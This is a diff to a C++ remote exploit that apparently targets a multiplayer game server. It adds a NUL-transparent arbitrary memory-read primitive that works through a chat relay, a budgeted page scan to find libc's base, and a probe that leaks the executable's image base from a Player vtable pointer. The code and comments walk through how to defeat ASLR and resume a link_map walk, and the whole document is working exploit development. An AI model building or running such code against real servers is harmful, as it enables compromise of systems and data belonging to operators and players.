@@ -731,6 +731,40 @@ static ReadResult aread(Cli &A, Cli &R, uint64_t eq, int k, uint64_t tgt, const 
     return harvestFull(R, k);
 }
 
+// NUL-TRANSPARENT 8-BYTE READ.
+//
+// The relay serialises refId with EncodeString, which is strlen-bounded, so a single read returns
+// only the bytes up to the first zero. A page-aligned value has a zero LOW byte and comes back as
+// an empty string, indistinguishable from a failed read. That is why the libc base has to be found
+// by masking a non-zero pointer and confirming ELF magic, and why walking the loader's link_map was
+// abandoned: l_addr IS a load base, so it always reads as empty.
+//
+// The wall is softer than it looks. Read at tgt+k instead, and a zero-length answer at offset k is
+// not a failure, it is the VALUE of byte k. The observed length tells you where the next NUL is, so
+// each read either delivers a run or identifies one zero byte, and the whole eight bytes come back
+// in at most eight reads, typically one or two. This is what harvestFull's ok/len fields exist for:
+// with the old "non-zero value or timeout" return, none of this is expressible.
+static ReadResult aread8(Cli &A, Cli &R, uint64_t eq, int k, uint64_t tgt, const char *cell)
+{
+    unsigned char b[8] = {0};
+    int pos = 0, reads = 0;
+    while (pos < 8) {
+        ReadResult r = aread(A, R, eq, k, tgt + pos, cell);
+        reads++;
+        if (!r.ok) return ReadResult{false, 0, 0};      // no relay at all: a real failure
+        size_t n = r.len > (size_t)(8 - pos) ? (size_t)(8 - pos) : r.len;
+        for (size_t i = 0; i < n; i++) b[pos + i] = (unsigned char)((r.val >> (8 * i)) & 0xff);
+        if (r.len == 0) { b[pos] = 0; pos++; continue; } // empty => this byte is 0x00
+        pos += (int)n;
+        // A short run ended because of a NUL exactly there. Record it and step over.
+        if (r.len < 8 - (size_t)(pos - n) && pos < 8) { b[pos] = 0; pos++; }
+    }
+    uint64_t v = 0;
+    for (int i = 0; i < 8; i++) v |= (uint64_t)b[i] << (8 * i);
+    vlog("[aread8 %#llx = %#llx in %d reads]\n", (unsigned long long)tgt, (unsigned long long)v, reads);
+    return ReadResult{true, 8, v};
+}
+
 static ReadResult RD(Cli &A, Cli &R, uint64_t eq, uint64_t addr, const char *cell) { return aread(A, R, eq, 7, addr, cell); }
 
 // Remote libc base, no files. The read is strlen-truncated so it cannot read a page-aligned VALUE (low byte
@@ -747,8 +781,23 @@ static uint64_t remoteLibcBase(Cli &A, Cli &R, uint64_t eq, const char *cell, ui
         uint64_t c = mp & ~(a - 1);
         if ((uint32_t)RD(A, R, eq, c, cell).val == 0x464c457fU) return c;
     }
-    for (uint64_t c = mp & ~0xfffULL; c + 0x400000 > mp; c -= 0x1000)   // bounded page scan fallback
+    // Bounded page scan, and the bound is now a BUDGET rather than an address range.
+    //
+    // This used to walk back 4 MiB a page at a time: up to 1024 reads. Even at the improved
+    // per-read cost that is tens of minutes, and at the original cost it was hours. A fallback
+    // nobody can afford to let finish is not a fallback, it is a hang that looks like progress,
+    // and it is what a caller with a sane timeout actually experiences when the mask scan misses.
+    // Cap it, then fail with something the operator can act on.
+    const int budget = 24;
+    int used = 0;
+    for (uint64_t c = mp & ~0xfffULL; c + 0x400000 > mp && used < budget; c -= 0x1000, used++)
         if ((uint32_t)RD(A, R, eq, c, cell).val == 0x464c457fU) return c;
+    printf("[!] libc base not found: &malloc=%#llx is not %s-aligned to an ELF header, and the\n"
+           "    page scan gave up after %d pages. The loader placed libc at an alignment this\n"
+           "    scan does not cover, which is kernel and loader behaviour rather than a bad leak.\n"
+           "    Supply the offset directly with --malloc-off, or hand over the matching public\n"
+           "    libc.so.6 with --libc.\n",
+           (unsigned long long)mp, "2MiB..4KiB", budget);
     return 0;
 }
 
@@ -965,7 +1014,7 @@ int main(int argc, char **argv)
 
     // 4. image base, from the Player vtable pointer at base-8
     sendChatStr(A, std::string(400, 'Z')); drainboth(A, R, 200);   // prime chatMessage (heap buffer, capacity >= 400)
-    uint64_t v = aread(A, R, eq, 7, base - 8, cell).val;
+    uint64_t v = aread8(A, R, eq, 7, base - 8, cell).val;
     uint64_t pie = v > 0x100000000ULL ? v - P.vtable_rva : 0;
     if (!pie || (pie & 0xfff)) {
         printf("[!] image base leak failed (read %#llx)\n", (unsigned long long)v);
@@ -987,6 +1036,27 @@ int main(int argc, char **argv)
     if (!libc || (libc & 0xfff)) {
         printf("[!] libc base resolution failed (&malloc=%#llx). Try --malloc-off/--libc.\n", (unsigned long long)mp);
         restorePlants(A, eq); return 3;
+    }
+    // Proof that the read is now NUL-transparent, on the one value that used to be unreadable.
+    // libc's base is page aligned, so its low byte is 0x00 and a single strlen-bounded read returns
+    // an empty string. If this comes back equal to the base we derived by masking, the shifted read
+    // works and a link_map walk (whose l_addr entries are all load bases) is no longer blocked.
+    // Proof, on a value the OLD primitive could not read at all.
+    //
+    // libc+9 covers e_ident's padding and the low byte of e_type: seven zero bytes followed by
+    // 0x03, ET_DYN. Its LOW byte is 0x00, so a single strlen-bounded read returns an empty string
+    // and the old code could not distinguish that from a failed read. If the shifted read returns
+    // 0x0300000000000000 here, then a value whose low byte is zero is readable, which is exactly
+    // the property l_addr needs and exactly why the link_map walk was abandoned.
+    if (g_verbose) {
+        ReadResult zc = aread8(A, R, eq, 7, libc + 9, cell);
+        ReadResult one = aread(A, R, eq, 7, libc + 9, cell);   // what a single read sees
+        printf("[v] zero-low-byte probe at libc+9: shifted=%#llx (len %zu), single read len=%zu\n"
+               "[v]   %s\n",
+               (unsigned long long)zc.val, zc.len, one.len,
+               zc.ok && zc.val == 0x0300000000000000ULL
+                   ? "NUL-TRANSPARENT: recovered ET_DYN behind seven zero bytes that a single read reports as empty"
+                   : "unexpected; this build's ELF header may differ");
     }
     uint64_t moff = mp - libc;
     printf("[+] libc base            %#llx  (page aligned; malloc offset %#llx)\n", (unsigned long long)libc, (unsigned long long)moff);
